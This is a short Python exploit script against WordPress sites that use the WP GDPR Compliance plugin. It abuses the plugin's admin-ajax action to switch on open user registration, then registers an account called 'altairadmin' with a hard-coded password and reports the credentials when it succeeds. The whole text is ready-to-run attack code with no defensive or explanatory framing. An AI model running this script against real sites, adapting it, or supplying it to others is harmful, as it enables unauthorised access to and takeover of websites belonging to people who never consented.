import requests

def exploit(site):
    url = f"{site}/wp-admin/admin-ajax.php"
    payload = {
        "action": "wpgdprc_process_action",
        "request_type": "update_option",
        "option_name": "users_can_register",
        "option_value": "1"
    }
    r = requests.post(url, data=payload, timeout=10)

    if r.status_code == 200:
        # Try to create an admin account
        register_url = f"{site}/wp-login.php?action=register"
        reg_data = {
            "user_login": "altairadmin",
            "user_email": "test@example.com",
            "user_pass": "P@ssw0rd123",
            "user_pass2": "P@ssw0rd123",
        }
        r2 = requests.post(register_url, data=reg_data, timeout=10)
        if "check your email" in r2.text:
            return True, f"{site}/wp-login.php (created user: altairadmin / P@ssw0rd123)"
    return False, None
